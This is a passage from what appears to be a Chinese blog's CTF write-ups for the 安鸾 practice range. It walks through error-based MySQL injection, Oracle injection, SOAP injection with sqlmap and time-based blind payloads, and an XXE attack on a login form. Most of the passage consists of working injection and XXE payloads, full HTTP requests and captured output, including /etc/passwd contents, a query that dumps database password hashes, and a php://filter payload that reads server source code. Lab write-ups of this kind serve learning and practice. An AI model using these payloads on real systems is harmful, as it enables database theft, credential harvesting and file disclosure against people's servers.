concat(user(),0x7e,database(),0x7e))),floor(rand(0)*2))x from information_schema.tables group by x)a))%23// Error: Duplicate entry &#x27;root@localhost~122~1&#x27; for key &#x27;group_key&#x27;--&gt;当前库有122个不重复的表！！！http://47.103.94.191:8042/faq.php?action=grouppermission&amp;gids[t00ls]=%27&amp;gids[t00ls1][]=,(select 1 from(select count(*),concat((select (select concat(user(),0x7e,(select count(distinct(table_name)) from information_schema.columns where table_schema=database()),0x7e))),floor(rand(0)*2))x from information_schema.tables group by x)a))%23// 在当前表用 bp爆破 找不到flag相关表，放大范围（所有表）--&gt;flag_nicehttp://47.103.94.191:8042/faq.php?action=grouppermission&amp;gids[t00ls]=%27&amp;gids[t00ls1][]=,(select 1 from(select count(*),concat((select (select concat(user(),0x7e,(select distinct(table_name) from information_schema.columns limit 173,1),0x7e))),floor(rand(0)*2))x from information_schema.tables group by x)a))%23// 所以……是在哪个库里的……--&gt;ucenter// 注：where子查询需要需要16进制编码：flag_nice--&gt;0x666c61675f6e696365http://47.103.94.191:8042/faq.php?action=grouppermission&amp;gids[t00ls]=%27&amp;gids[t00ls1][]=,(select 1 from(select count(*),concat((select (select concat(user(),0x7e,(select distinct(table_schema) from information_schema.columns where table_name=0x666c61675f6e696365),0x7e))),floor(rand(0)*2))x from information_schema.tables group by x)a))%23// 字段--&gt;flag_is_herehttp://47.103.94.191:8042/faq.php?action=grouppermission&amp;gids[t00ls]=%27&amp;gids[t00ls1][]=,(select 1 from(select count(*),concat((select (select concat(user(),0x7e,(select distinct(column_name) from information_schema.columns where table_name=0x666c61675f6e696365),0x7e))),floor(rand(0)*2))x from information_schema.tables group by x)a))%23// 如上语句出现其他错误：Subquery returns more than 1 rowhttp://47.103.94.191:8042/faq.php?action=grouppermission&amp;gids[t00ls]=%27&amp;gids[t00ls1][]=,(select 1 from(select count(*),concat((select (select concat(user(),0x7e,(select flag_is_here from ucenter.flag_nice limit 1),0x7e))),floor(rand(0)*2))x from information_schema.tables group by x)a))%23// 多条记录？？？限定返回一条记录了的！改为查询记录数，确是仅有一条记录// 查阅其他wp，说是flag过长所致！！！添加 substring 方法进行截断// 似是而非？暂时当作是！！！// flag--&gt;flag&#123;5e5c2dea317a62d0c43db8143e09d91a&#125;http://47.103.94.191:8042/faq.php?action=grouppermission&amp;gids[t00ls]=%27&amp;gids[t00ls1][]=,(select 1 from(select count(*),concat((select (select concat(user(),0x7e,substring((select flag_is_here from ucenter.flag_nice limit 1),1,40),0x7e))),floor(rand(0)*2))x from information_schema.tables group by x)a))%23\nGET /faq.php?action=grouppermission&amp;gids[t00ls]=%27&amp;gids[t00ls1][]=,(select%201%20from(select%20count(*),concat((select%20(select%20concat(user(),0x7e,(select%20distinct(table_name)%20from%20information_schema.columns%20limit%20173,1),0x7e))),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a))%23 HTTP/1.1Host: 47.103.94.191:8042Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Cookie: pR1_sid=2QZKZM; ECS_ID=c139056c976fc6deeb76c792a0d2ccfff0b93823; ECS[visit_times]=1Connection: close\n\n0x0a Oracle注入0o00 题目提示oracle注入题目url：http://106.15.50.112:8015/search.php\n\n0o01 Oracle 部分知识0b00 基础知识\nOracle数据库的注释符，单行注释：--，多行注释：/**/。\ndual：Oracle 数据库的虚表，供任意用户读取，在没有目标表的select语句中经常用到\nOracle 数据库使用||拼接字符串。\nOracle 数据库对 MySQL 数据库中limit关键字的表述转为使用虚表的rownum字段判断：select * from users where rownum=1;。\nOracle数据库中使用双引号&quot;来消除系统关键字，即某一字段能与系统关键字同名时，将该关键字用双引号引起：select &quot;where&quot; from tests。\n用户：Oracle 数据库的基本单位，类似 MySQL 数据库的库。\n表：Oracle 的每一个用户下有表，类似 MySQL 数据库的库下的表。\n表空间：Oracle 数据库的逻辑划分，是Oracle数据库恢复的最小单位。一个 Oracle 数据库至少有一个表空间（system表空间）。\n\n0b01 默认表空间\nOracle 数据库创建时，默认生成5个表空间，如下：\n\n\nSYSTEM：存储系统表和管理配置等基本信息。\nSYSAUX：类似于SYSTEM，存放系统附加信息，减轻 SYSTEM 的空间负担。\nUNDO：用于事务回退等。\nTEMP：存储临时数据。\nUSERS：默认存储用户信息的表空间。\n\n0b10 权限与用户\n权限区分：\n\n\nDBA：系统最高权限，可创建数据库结构。\nresource：仅可创建实体，不可以创建数据库结构。\nconnect：仅可登录 Oracle，不可以创建实体，不可以创建数据库结构。\n\n\n默认用户区分\n\n\nsys：类似 Linux 的 root 用户，属于 DBA 角色。\nsystem：类似 sys 用户，但缺少修改关键系统数据的权限，属于 DBA 角色。\npublic：类似一个数据库用户的集合，对其操作会应用到所有用户上。\n\n0b11 部分系统表\ndba_users：数据库用户信息。\ndba_segments：表段信息。\ndba_tablespaces：数据库表空间信息。\nuser_segments：当前用户的表段信息。\nuser_tables：当前用户的表对象信息，常用字段：table_name。\nuser_tab_columns：当前用户的表列信息，常用字段：column_name。\nall_users：数据库所有用户的信息。\nall_objects：数据库所有对象的信息。\nall_tables：数据库所有表对象的信息。\nsession_roles：会话角色信息。\nsession_privs：会话角色权限。\nv$database：数据库信息。\nv$datafile：数据文件信息。\nv$logfile：日志文件信息。\nv$loghist：日志历史信息。\n\n0o02 注入流程\n笔者不了解 Oracle 数据库，此处不做过多说明。\n度娘找几篇 Oracle 手注文章。\n题目为搜索型注入，直接写入1&#39;报错：ORA-01756: quoted string not properly terminated，即引用字符串未正确终止（单引号）。\n\n// 报错注入// 测试存在 --&gt; ORA-01756: quoted string not properly terminatedname=1&#x27;// 构造闭合name=1&#x27; or 1=1 -- -// 爆 Oracle 版本 --&gt; Oracle Database 10g Express Edition Release 10.2.0.1.0name=1&#x27; and 1=ctxsys.drithsx.sn(1, (select banner from v$version where rownum=1)) -- -// 爆 IP 地址 --&gt; 172.22.0.2name=1&#x27; and 1=ctxsys.drithsx.sn(1, (select utl_inaddr.get_host_address from dual)) -- -// 爆日志文件位置 --&gt; /usr/lib/oracle/xe/app/oracle/flash_recovery_area/XE/onlinelog/o1_mf_2_k7df9co7_.logname=1&#x27; and 1=ctxsys.drithsx.sn(1, (select member from v$logfile where rownum=1)) -- -// 判DBA权限 --&gt; FALSEname=1&#x27; and 1=ctxsys.drithsx.sn(1, (select SYS_CONTEXT (&#x27;USERENV&#x27;, &#x27;ISDBA&#x27;) from dual)) -- -// 爆全部表空间，修改数字“6”处即可 --&gt; PENTEST// 说明：ROWNUM 为伪列，是伴随结果集生成的字段// 内层语句中，拿到了内层结果集的两个字段，其中 ROWNUM 字段重命名为 CON。// 外层语句中，利用内层结果集作虚表再次查询，通过 CON 字段指定返回的某条记录。// 判断，两层嵌套的目的是为了达到类似 limit 关键字的效果，即拿到指定记录。name=1&#x27; and 1=ctxsys.drithsx.sn(1, (SELECT TABLESPACE_NAME FROM(SELECT DBA_TABLESPACES.TABLESPACE_NAME, ROWNUM AS CON FROM DBA_TABLESPACES WHERE ROWNUM&gt;0)WHERE CON=6)) -- -// 爆当前表空间的表 --&gt; USERS，FLAG_HEREname=1&#x27; and 1=ctxsys.drithsx.sn(1, (SELECT table_name FROM(SELECT user_tables.table_name, ROWNUM AS CON FROM user_tables WHERE ROWNUM&gt;0)WHERE CON=2)) -- -// 爆当前表空间下 FLAG_HERE 表字段 --&gt; ID，FLAG_NAMEname=1&#x27; and 1=ctxsys.drithsx.sn(1, (SELECT column_name FROM(SELECT user_tab_columns.column_name, ROWNUM AS CON FROM user_tab_columns WHERE ROWNUM &gt;0 and table_name=&#x27;FLAG_HERE&#x27;)WHERE CON=2)) -- -// 爆内容???看着不像 --&gt; this_is_flagname=1&#x27; and 1=ctxsys.drithsx.sn(1, (SELECT FLAG_NAME FROM(SELECT FLAG_HERE.FLAG_NAME, ROWNUM AS CON FROM FLAG_HERE WHERE ROWNUM&gt;0)WHERE CON =1)) -- -// 这个表有两条记录！！！ --&gt; flag&#123;65736915fea1aa72a0b2446540a81524&#125;name=1&#x27; and 1=ctxsys.drithsx.sn(1, (SELECT FLAG_NAME FROM(SELECT FLAG_HERE.FLAG_NAME, ROWNUM AS CON FROM FLAG_HERE WHERE ROWNUM&gt;0)WHERE CON =2)) -- -\n\n// 联合查询// order byp 判断字段个数name=1&#x27; order by 4 -- -// 查字段数，判断输出点name=-1&#x27;  union select null,null,null from dual -- -// 字段类型猜想name=-1&#x27;  union select 3,&#x27;2&#x27;,&#x27;1&#x27; from dual -- -// 查看当前数据库连接用户 --&gt; PENTESTname=1&#x27; union select 3,(SELECT user FROM dual),&#x27;2&#x27; from dual-- -// 爆SID --&gt; XEname=-1&#x27;  union select 3,(select instance_name from V$INSTANCE),&#x27;1&#x27; from dual -- -// 爆账密name=1&#x27; union select 1,name,spare4 from(select rownum as con,name,spare4 from sys.user$ where rownum&gt;0) where con=30-- -// 拿flagname=-1&#x27;  union select 3,(SELECT FLAG_NAME FROM(SELECT FLAG_HERE.FLAG_NAME, ROWNUM AS CON FROM FLAG_HERE WHERE ROWNUM&gt;0)WHERE CON =2),&#x27;1&#x27; from dual -- -\n\n0o03 参考文档\nhttps://www.jianshu.com/p/5ce219032823\nhttps://blog.csdn.net/weixin_42508548/article/details/121516717\nhttps://mp.weixin.qq.com/s?__biz=MzIwODAzNzcxMQ==&amp;mid=2247483713&amp;idx=1&amp;sn=2ec5d7db9cc1612ded726aa16c96aff7&amp;chksm=97087361a07ffa77a0fb73d53c626424030297e8362ffad386bbb5b12a3772359fd13eafce86&amp;mpshare=1&amp;scene=23&amp;srcid=0605AN2Ie50vNytZpMqAkDcD&amp;sharer_sharetime=1654435175432&amp;sharer_shareid=2957c05f62be643745e32bae234d95a3#rd\nhttps://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247489858&amp;idx=1&amp;sn=404e485caa4e7a537b66fa2dcdcf69dc&amp;chksm=e89e319adfe9b88c414d20db1246404b3596b7f676cd7a042a64192442155e201f0826eae702&amp;mpshare=1&amp;scene=23&amp;srcid=0606jTmPMqnguiS9U9jPMtrf&amp;sharer_sharetime=1654481070263&amp;sharer_shareid=2957c05f62be643745e32bae234d95a3#rd\n\n0x0b SOAP协议注入0b00 题目提示SOAP协议注入题目URL：http://47.103.94.191:8018/提示：flag在数据库里面\n0b01 SOAP协议\n即简单对象访问协议，是数据交换的一种协议规范，是一种轻量的、简单的、基于XML的协议，被设计成在WEB上交换结构化的和固化的信息。\nSOAP=RPC+HTTP+XML，即采用HTTP通信协议，RPC作为一致性的调用途径，XLM作为数据传送的格式。\n消息格式&lt;?xml version=&quot;1.0&quot;?&gt;&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;  &lt;soap:Header&gt;  &lt;/soap:Header&gt;  &lt;soap:Body&gt;    &lt;soap:Fault&gt;    &lt;/soap:Fault&gt;  &lt;/soap:Body&gt;&lt;/soap:Envelope&gt;&lt;!--Envelope 元素：可将 xml 文档标识为 soap 消息。Header 元素：包含头部信息。Body 元素：包含所有的调用和响应信息，当Body内有存在数据可控时，有可能存在注入。Fault 元素：提供有关在处理此消息时所发生错误的信息。--&gt;\nSOAP请求易受SQL注入攻击，提交参数作为变种 SQL　查询可以泄露敏感信息。\n\n0o02 注入过程\nburp suite下载插件：Wsdler。\n\nburp 抓取http://47.103.94.191:8018/ws_soap.php?wsdl页面请求包，并发送到Wsdler模块（右键 –&gt; Extensions –&gt; Wsdler –&gt; Parse WSDL），将Parse WSDL解析出来的SOAP请求包复制下来，可以直接丢到sqlmap梭一把，抑或手注。\nPOST /ws_soap.php HTTP/1.1Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.33Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://47.103.94.191:8018/ws_soap.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Cookie: pR1_sid=GqRRY0; ECS[display]=grid; ECS[history]=9%2C8; ECS[visit_times]=6Connection: closeSOAPAction: urn:tickets_stock#get_tickets_stockContent-Type: text/xml;charset=UTF-8Host: 47.103.94.191:8018Content-Length: 471&lt;soapenv:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:urn=&quot;urn:tickets_stock&quot;&gt;&lt;soapenv:Header/&gt;&lt;soapenv:Body&gt;&lt;urn:get_tickets_stock soapenv:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;title xsi:type=&quot;xsd:string&quot;&gt;gero et&lt;/title&gt;&lt;/urn:get_tickets_stock&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;\n\n\nsqlmap自动化部分步骤\n// 拿到当前数据库 --&gt; whalwlsqlmap -r admin.txt --batch --current-db// 拿到 flag 相关表 --&gt; this_flagsqlmap -r admin.txt --batch -D whalwl --tables// 拿到 this_flag 表下关键字段 --&gt; flagsqlmap -r admin.txt --batch -D whalwl -T this_flag --columns// 拿到flag（很慢，建议来把农药） --&gt; flag&#123;ba8b6a6f6e38ed7e173d03504132dbe8&#125;sqlmap -r admin.txt --batch -D whalwl -T this_flag -C flag --dump\n\n\n基于 sqlmap payload 的时间盲注（手注）\n// 根据 sqlmap 提供的payload——时间盲注gero et&#x27; AND (SELECT 6543 FROM (SELECT(SLEEP(5)))woly) AND &#x27;XqLo&#x27;=&#x27;XqLo// 构造判断当前数据库名长度——两层 select 语句gero et&#x27; and (select 1 from(select if(length(database())=5,2,sleep(10)))tumei) -- -// 猜当前库名，配合 burp 爆破gero et&#x27; and (select 1 from(select if((select substr(database(),2,1)=&#x27;h&#x27;),sleep(5),6))a) -- -// ……猜flag，可以先猜内容长度，再进行爆破，减少非必要的时间，这里懒了// 导出结果集，复制到excel进行排序提取内容，合并1列单元格：=TEXTJOIN(&quot;&quot;,TRUE,B2:B39)// &#x27;&#123;&#x27;参数被转义问题，解决：爆破模块 --&gt; Payloads --&gt; Payload Encding 处取消勾选，即可不被编码。gero et&#x27; and (select 1 from(select if((select substr(flag,5,1) from this_flag limit 1,1)=&#x27;&#123;&#x27;,sleep(5),6))tumei) -- -\n\n\n基于 awvs payload 的联合查询（手注）\n\n\n\n看了下 awvs 的扫描结果，嘿？直接出库名？联想到前面写时间盲注时思考是否会有回显位（那时直接在gero et的基础上操作，压根没置-1），果断修改 awvs payload 参数（重点：-1，使前一个 select 语句无结果）。// 直接拿到库名-1&#x27; union select database() -- -// 需要思路而已，其他老套路了，这里直接拿flag-1&#x27; union select flag from this_flag limit 1,1 -- -\n\n\n0x0c 完本总结\n总的来讲，题目很基础，笔者很菜！一句话，贵在坚持、思考与行动！\n\n","categories":["靶场"],"tags":["安鸾","SQL"]},{"title":"安鸾之XXE漏洞","url":"/article/10a5a8a4.html","content":"前言\n本文章起笔时神烦，用打下靶场转移下思绪。注：本教程仅供学习参考，请勿用在非法途径上，违者后果自负，与笔者无关。\t–涂寐\n\n笔记靶场信息XML外部实体注入，简称XXE网站URL：http://www.whalwl.work:8016/提示：flag文件在服务器根目录下，文件名为flag\n通关记录\n登录框当然先是一波弱口令，admin&#x2F;admin，有提示弹窗。改下密码看效果\nadmin 登陆成功!admin 登陆失败!\n\n好吧，直接尝试写入xml文档，得到一堆报错信息\n&lt;?xml version=&quot;1.0&quot;  encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE note [\t&lt;!ENTITY tumei SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;name&gt;&amp;tumei;&lt;/name&gt;\nError: Invalid XML: &lt;b&gt;Warning&lt;/b&gt;:  DOMDocument::loadXML() [&lt;a href=&#x27;domdocument.loadxml&#x27;&gt;domdocument.loadxml&lt;/a&gt;]: XML declaration allowed only at the start of the document in Entity, line: 1 in &lt;b&gt;/var/www/html/doLogin.php&lt;/b&gt; on line &lt;b&gt;12&lt;/b&gt;&lt;b&gt;Warning&lt;/b&gt;:  DOMDocument::loadXML() [&lt;a href=&#x27;domdocument.loadxml&#x27;&gt;domdocument.loadxml&lt;/a&gt;]: StartTag: invalid element name in Entity, line: 1 in &lt;b&gt;/var/www/html/doLogin.php&lt;/b&gt; on line &lt;b&gt;12&lt;/b&gt;&lt;b&gt;Warning&lt;/b&gt;:  DOMDocument::loadXML() [&lt;a href=&#x27;domdocument.loadxml&#x27;&gt;domdocument.loadxml&lt;/a&gt;]: StartTag: invalid element name in Entity, line: 1 in &lt;b&gt;/var/www/html/doLogin.php&lt;/b&gt; on line &lt;b&gt;12&lt;/b&gt;&lt;b&gt;Warning&lt;/b&gt;:  DOMDocument::loadXML() [&lt;a href=&#x27;domdocument.loadxml&#x27;&gt;domdocument.loadxml&lt;/a&gt;]: Entity &#x27;tumei&#x27; not defined in Entity, line: 1 in &lt;b&gt;/var/www/html/doLogin.php&lt;/b&gt; on line &lt;b&gt;12&lt;/b&gt;&lt;b&gt;Warning&lt;/b&gt;:  simplexml_import_dom() [&lt;a href=&#x27;function.simplexml-import-dom&#x27;&gt;function.simplexml-import-dom&lt;/a&gt;]: Invalid Nodetype to import in &lt;b&gt;/var/www/html/doLogin.php&lt;/b&gt; on line &lt;b&gt;13&lt;/b&gt;&lt;b&gt;Warning&lt;/b&gt;:  Cannot modify header information - headers already sent by (output started at /var/www/html/doLogin.php:12) in &lt;b&gt;/var/www/html/doLogin.php&lt;/b&gt; on line &lt;b&gt;27&lt;/b&gt;&lt;result&gt;&lt;code&gt;0&lt;/code&gt;&lt;msg&gt;&lt;/msg&gt;&lt;/result&gt;:parsererror\n\n简要分析下报错，先看下某翻译的效果；说下收获，拿到了物理路径\n错误：无效的XML:&lt;br/&gt;&lt;b&gt;警告&lt;/b&gt;：DOMDocument:：loadXML（）[&lt;a href=&#x27;DOMDocument.loadXML&#x27;&gt;DOMDocument.loadXML&lt;/a&gt;]：仅允许在&lt;b&gt;/var/www/html/doLogin中的实体第1行的文档开头进行XML声明。php&lt;/b&gt;在线&lt;b&gt;12&lt;/b&gt;&lt;br/&gt;&lt;br/&gt;&lt;b&gt;警告：DOMDocument:：loadXML（）[&lt;a href=&#x27;DOMDocument.loadXML&#x27;&gt;DOMDocument.loadXML&lt;/a&gt;]：StartTag:Entity中的元素名称无效，&lt;b&gt;/var/www/html/doLogin中的第1行。php&lt;/b&gt;在线&lt;b&gt;12&lt;/b&gt;&lt;br/&gt;&lt;br/&gt;&lt;b&gt;警告：DOMDocument:：loadXML（）[&lt;a href=&#x27;DOMDocument.loadXML&#x27;&gt;DOMDocument.loadXML&lt;/a&gt;]：StartTag:Entity中的元素名称无效，&lt;b&gt;/var/www/html/doLogin中的第1行。php&lt;/b&gt;在线&lt;b&gt;12&lt;/b&gt;&lt;br/&gt;&lt;br/&gt;&lt;b&gt;警告&lt;/b&gt;：DOMDocument:：loadXML（）[&lt;a href=&#x27;DOMDocument.loadXML&#x27;&gt;DOMDocument.loadXML&lt;/a&gt;]：未在&lt;b&gt;/var/www/html/doLogin中的实体第1行中定义实体“tumei”。php&lt;/b&gt;在线&lt;b&gt;12&lt;/b&gt;&lt;br/&gt;&lt;br/&gt;&lt;b&gt;警告：simplexml导入dom（）[&lt;a href=&#x27;function.simplexml导入dom&#x27;&gt;函数。simplexml导入dom&lt;/a&gt;]：要在&lt;b&gt;/var/www/html/doLogin中导入的节点类型无效。php&lt;/b&gt;在线&lt;b&gt;13&lt;/b&gt;&lt;br/&gt;&lt;br/&gt;&lt;b&gt;警告&lt;/b&gt;：无法修改标题信息-标题已由&lt;b&gt;/var/www/html/doLogin中的（输出开始于/var/www/html/doLogin.php:12）发送。php&lt;/b&gt;在线&lt;b&gt;27&lt;/b&gt;&lt;br/&gt;&lt;result&gt;&lt;code&gt;0&lt;/code&gt;&lt;msg&gt;&lt;/msg&gt;&lt;/result&gt;：解析器错误\n\n算啦，去bp抓个包看下请求\n# 以下注释仅笔者理解，欢迎提出不同意见POST /doLogin.php HTTP/1.1Host: www.whalwl.work:8016User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0# 请求头，表示发送端（客户端）希望接受的数据类型Accept: application/xml, text/xml, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflate# 实体头，表示发送端（客户端|服务器）发送的实体数据的数据类型Content-Type: application/xml;charset=utf-8# 请求方式，XMLHttpRequest 则为 Ajax 请求(异步HTTP)X-Requested-With: XMLHttpRequestReferer: http://www.whalwl.work:8016/Content-Length: 65DNT: 1Connection: close&lt;user&gt;&lt;username&gt;admin&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;\n\n观察部分请求头（Accept）可知通过xml传参，构造请求参数，恭喜你得到新的报错\nPOST /doLogin.php HTTP/1.1Host: www.whalwl.work:8016User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: application/xml, text/xml, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/xml;charset=utf-8X-Requested-With: XMLHttpRequestReferer: http://www.whalwl.work:8016/Content-Length: 225DNT: 1Connection: close&lt;?xml version=&quot;1.0&quot;  encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE note [\t&lt;!ENTITY tumei SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;name&gt;&amp;tumei;&lt;/name&gt;&lt;user&gt;&lt;username&gt;admin&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;\n&lt;b&gt;Warning&lt;/b&gt;:  DOMDocument::loadXML() [&lt;a href=&#x27;domdocument.loadxml&#x27;&gt;domdocument.loadxml&lt;/a&gt;]: Input is not proper UTF-8, indicate encoding !Bytes: 0x81 0xFB 0xD6 0x84 in Entity, line: 3 in &lt;b&gt;/var/www/html/doLogin.php&lt;/b&gt; on line &lt;b&gt;12&lt;/b&gt;&lt;b&gt;Warning&lt;/b&gt;:  DOMDocument::loadXML() [&lt;a href=&#x27;domdocument.loadxml&#x27;&gt;domdocument.loadxml&lt;/a&gt;]: Extra content at the end of the document in Entity, line: 6 in &lt;b&gt;/var/www/html/doLogin.php&lt;/b&gt; on line &lt;b&gt;12&lt;/b&gt;&lt;b&gt;Warning&lt;/b&gt;:  simplexml_import_dom() [&lt;a href=&#x27;function.simplexml-import-dom&#x27;&gt;function.simplexml-import-dom&lt;/a&gt;]: Invalid Nodetype to import in &lt;b&gt;/var/www/html/doLogin.php&lt;/b&gt; on line &lt;b&gt;13&lt;/b&gt;&lt;b&gt;Warning&lt;/b&gt;:  Cannot modify header information - headers already sent by (output started at /var/www/html/doLogin.php:12) in &lt;b&gt;/var/www/html/doLogin.php&lt;/b&gt; on line &lt;b&gt;27&lt;/b&gt;&lt;result&gt;&lt;code&gt;0&lt;/code&gt;&lt;msg&gt;&lt;/msg&gt;&lt;/result&gt;\n&lt;br/&gt;&lt;b&gt;警告：DOMDocument:：loadXML（）[&lt;a href=&#x27;DOMDocument.loadXML&#x27;&gt;DOMDocument.loadXML&lt;/a&gt;]：输入不正确，请指示编码！字节：0x81 0xFB 0xD6 0x84在实体中，第3行在&lt;b&gt;/var/www/html/doLogin中。php&lt;/b&gt;在线&lt;b&gt;12&lt;/b&gt;&lt;br/&gt;&lt;br/&gt;&lt;b&gt;警告&lt;/b&gt;：DOMDocument:：loadXML（）[&lt;a href=&#x27;DOMDocument.loadXML&#x27;&gt;DOMDocument.loadXML&lt;/a&gt;]：实体中文档末尾的额外内容，第6行，在&lt;b&gt;/var/www/html/doLogin中。php&lt;/b&gt;在线&lt;b&gt;12&lt;/b&gt;&lt;br/&gt;&lt;br/&gt;&lt;b&gt;警告：simplexml导入dom（）[&lt;a href=&#x27;function.simplexml导入dom&#x27;&gt;函数。simplexml导入dom&lt;/a&gt;]：要在&lt;b&gt;/var/www/html/doLogin中导入的节点类型无效。php&lt;/b&gt;在线&lt;b&gt;13&lt;/b&gt;&lt;br/&gt;&lt;br/&gt;&lt;b&gt;警告&lt;/b&gt;：无法修改标题信息-标题已由&lt;b&gt;/var/www/html/doLogin中的（输出开始于/var/www/html/doLogin.php:12）发送。php&lt;/b&gt;在线&lt;b&gt;27&lt;/b&gt;&lt;br/&gt;&lt;result&gt;&lt;code&gt;0&lt;/code&gt;&lt;msg&gt;&lt;/msg&gt;&lt;/result&gt;\n\n把参数 &amp;tumei; 作为 username 标签的内容，突如其来呀（应该是我太菜了）\nPOST /doLogin.php HTTP/1.1Host: www.whalwl.work:8016User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: application/xml, text/xml, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/xml;charset=utf-8X-Requested-With: XMLHttpRequestReferer: http://www.whalwl.work:8016/Content-Length: 176DNT: 1Connection: close&lt;?xml version=&quot;1.0&quot;  encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE note [\t&lt;!ENTITY tumei SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;tumei;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;\nHTTP/1.1 200 OKDate: Sun, 09 Jan 2022 03:04:32 GMTServer: Apache/2.4.10 (Debian) PHP/5.3.29X-Powered-By: PHP/5.3.29Vary: Accept-EncodingContent-Length: 1330Connection: closeContent-Type: text/html; charset=utf-8&lt;result&gt;&lt;code&gt;0&lt;/code&gt;&lt;msg&gt;root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinlibuuid:x:100:101::/var/lib/libuuid:/bin/shsystemd-timesync:x:101:104:systemd Time Synchronization,,,:/run/systemd:/bin/falsesystemd-network:x:102:105:systemd Network Management,,,:/run/systemd/netif:/bin/falsesystemd-resolve:x:103:106:systemd Resolver,,,:/run/systemd/resolve:/bin/falsesystemd-bus-proxy:x:104:107:systemd Bus Proxy,,,:/run/systemd:/bin/falsemessagebus:x:105:108::/var/run/dbus:/bin/false&lt;/msg&gt;&lt;/result&gt;\n换个方法，用php伪协议结合base64编码进行读取网页源码\n# 改用原因： 读取源代码并进行base64编码输出，避免php源码文件直接解析输出# 此处文件路径可写为绝对路径（之前报错提供）：/var/www/html/doLogin.phpPOST /doLogin.php HTTP/1.1Host: www.whalwl.work:8016User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: application/xml, text/xml, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/xml;charset=utf-8X-Requested-With: XMLHttpRequestReferer: http://www.whalwl.work:8016/Content-Length: 203DNT: 1Connection: close&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [\t&lt;!ENTITY tumei SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./doLogin.php&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;tumei;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;\nHTTP/1.1 200 OKDate: Sun, 09 Jan 2022 03:16:00 GMTServer: Apache/2.4.10 (Debian) PHP/5.3.29X-Powered-By: PHP/5.3.29Vary: Accept-EncodingContent-Length: 1066Connection: closeContent-Type: text/html; 